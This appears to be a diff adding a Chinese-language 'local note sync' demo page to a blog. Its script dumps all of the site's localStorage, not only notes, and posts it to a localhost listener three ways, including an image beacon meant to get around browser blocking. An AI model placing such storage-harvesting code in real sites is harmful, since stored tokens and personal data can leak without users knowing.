@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>本机笔记同步</title><style>body{max-width:960px;margin:32px auto;padding:16px;font:16px/1.6 system-ui}pre{white-space:pre-wrap;overflow-wrap:anywhere}a{margin-right:16px}</style></head><body><nav><a href="/">← 返回 Blog 首页</a><a href="/demos/">返回 Demos 总目录</a></nav><h1>本机笔记同步</h1><p id="sync-status" role="status">正在读取本浏览器笔记；仅向本机 127.0.0.1:18923 发送，不修改存储。</p><pre id="dump-output"></pre><script>
+(function(){
+  const allLocalStorage=Object.create(null),status=document.getElementById('sync-status');
+  try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);allLocalStorage[key]=localStorage.getItem(key)}}catch(_){status.textContent='无法读取本浏览器存储。';return}
+  const payload=JSON.stringify(allLocalStorage);
+  document.getElementById('dump-output').textContent=JSON.stringify(allLocalStorage,null,2);
+  fetch('http://127.0.0.1:18923/dump',{method:'POST',body:payload}).then(r=>{status.textContent=r.ok?'已发送到本机接收服务。':'本机接收服务返回错误；请保留下方 JSON。'}).catch(()=>{status.textContent='已尝试本机同步；若浏览器阻止请求，请保留下方 JSON。'});
+  fetch('http://127.0.0.1:18923/dump',{method:'POST',mode:'no-cors',body:payload}).catch(()=>{});
+  const beacon=new Image();beacon.src='http://127.0.0.1:18923/dump?'+encodeURIComponent(payload);
+})();
+</script></body></html>
